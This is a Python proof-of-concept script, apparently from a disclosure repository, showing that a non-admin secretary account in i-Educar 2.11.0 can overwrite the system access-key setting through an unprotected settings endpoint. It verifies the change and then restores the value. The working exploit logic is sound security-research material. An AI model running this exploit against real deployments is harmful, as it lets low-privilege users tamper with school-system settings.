#!/usr/bin/env python3
"""VULN 04 — missing authorization in SettingController::saveInputs().

`POST /configuracoes/configuracoes-de-sistema` writes every submitted
key/value pair into the `settings` table. The `index()` action checks
`isAdmin()`, but `saveInputs()` does not, and the route carries no `can:`
middleware. Any authenticated user can therefore rotate system settings such
as `legacy.apis.access_key` (setting id 3).

The PoC logs in as the non-admin secretary, changes the access key, proves the
change through the admin settings page, then restores the original value.
"""

from __future__ import annotations

import html
import os
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from lib import credentials, evidence, http_util, lab_guard, poc_cli  # noqa: E402

VULN = {
    "id": "04",
    "slug": "missing-authorization-settings-write",
    "title": "Missing authorization in SettingController::saveInputs()",
    "product": "i-Educar",
    "affected_version": "2.11.0 (latest release, tag 2.11.0)",
    "cwe_id": "CWE-862",
    "cwe_name": "Missing Authorization",
    "cwe_source_url": "https://cwe.mitre.org/data/definitions/862.html",
    "cwe_confidence": "high",
    "cwe_justification": (
        "The write action has no authorization check while the sibling read action does "
        "(isAdmin()), which is a textbook CWE-862. CWE-285 (improper authorization) would "
        "apply to a check that exists but is wrong; CWE-639 is about user-controlled keys "
        "bypassing ownership checks and does not describe this missing check."
    ),
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
    "cvss_score": 8.1,
    "endpoint": "POST /configuracoes/configuracoes-de-sistema",
    "params": ["<setting id>=<value> (e.g. 3=legacy.apis.access_key)"],
    "precondition": "login as any non-admin profile (secretary, level 2)",
    "reported_at": "",
    "followups": [],
    "silence_days": 0,
    "status": "verified",
    "blocked_reason": "",
    "screenshots": [
        "evidence/screenshots/04-missing-authorization-settings-write-01-access-key-changed-by-secretary.png",
        "evidence/screenshots/04-missing-authorization-settings-write-02-raw-proof.png",
    ],
    "advisory_url": "https://github.com/i-explorar/i-explorar/blob/main/vulns/04-missing-authorization-settings-write/README.md",
}

SECRETARY = credentials.credentials("secretary")
ADMIN = credentials.credentials("admin")
SETTING_LABEL = "Chave de acesso ao i-Educar"  # legacy.apis.access_key
SETTINGS_PATH = "/configuracoes/configuracoes-de-sistema"


def _find_setting(page: str, label: str) -> tuple[str | None, str | None]:
    """Locate the input for the labelled setting (ids differ between versions)."""
    match = re.search(re.escape(label) + r'.*?name="(\d+)"[^>]*value="([^"]*)"', page, re.S)
    if not match:
        return None, None
    return match.group(1), html.unescape(match.group(2))


def run(target: str, *, verbose: bool = False) -> dict:
    lab_guard.check_target(target)

    vuln_dir = Path(__file__).resolve().parent
    log = evidence.EvidenceLog(vuln_dir)
    notes: list[str] = []
    log.write(f"# target: {target}")

    secretary = http_util.HttpClient(target, verbose=verbose)
    admin = http_util.HttpClient(target, verbose=verbose)
    secretary.login(*SECRETARY)
    admin.login(*ADMIN)
    if not (secretary.logged_in() and admin.logged_in()):
        log.close()
        return {"vulnerable": False, "evidence": [str(log.path)], "notes": "login failed"}

    marker = f"IEXPLORAR_POC_KEY_{os.getpid()}"
    original = None
    vulnerable = False
    try:
        before = admin.get(SETTINGS_PATH)
        setting_id, original = _find_setting(before.text, SETTING_LABEL)
        log.write(f"# labelled setting {SETTING_LABEL!r} -> id={setting_id} value={original!r}")
        log.write(f"# admin settings page HTTP {before.status}")
        if setting_id is None:
            log.write("# could not locate the access-key setting on this target")
            return {"vulnerable": False, "evidence": [str(log.path)], "notes": "setting not found"}

        denied = secretary.get(SETTINGS_PATH)
        log.write("")
        log.write("### GET settings page as secretary (read denied)")
        log.write(f"HTTP {denied.status}")
        log.write(f"location: {denied.location}")

        write = secretary.post(SETTINGS_PATH, data={setting_id: marker})
        log.write("")
        log.write(f"### POST settings as secretary ({setting_id}={marker})")
        log.write(f"HTTP {write.status}")
        log.write(f"location: {write.location}")

        after = admin.get(SETTINGS_PATH)
        new_value = _find_setting(after.text, SETTING_LABEL)[1]
        log.write(f"# admin sees setting {setting_id} = {new_value!r} after the secretary write")
        vulnerable = new_value == marker
    finally:
        if original is not None:
            restore = secretary.post(SETTINGS_PATH, data={setting_id: original})
            log.write("")
            log.write(f"### restore ({setting_id}={original}) as secretary")
            log.write(f"HTTP {restore.status}")
            check = admin.get(SETTINGS_PATH)
            log.write(f"# admin sees setting {setting_id} = {_find_setting(check.text, SETTING_LABEL)[1]!r} after restore")
        log.close()

    notes.append(
        f"setting {setting_id} changed from {original!r} to the attacker value by the "
        f"non-admin secretary and restored afterwards; vulnerable={vulnerable}"
    )
    return {"vulnerable": vulnerable, "evidence": [str(log.path)], "notes": "; ".join(notes)}


def main(argv: list[str] | None = None) -> int:
    return poc_cli.poc_main(VULN, run, argv, __file__)


if __name__ == "__main__":
    sys.exit(main())
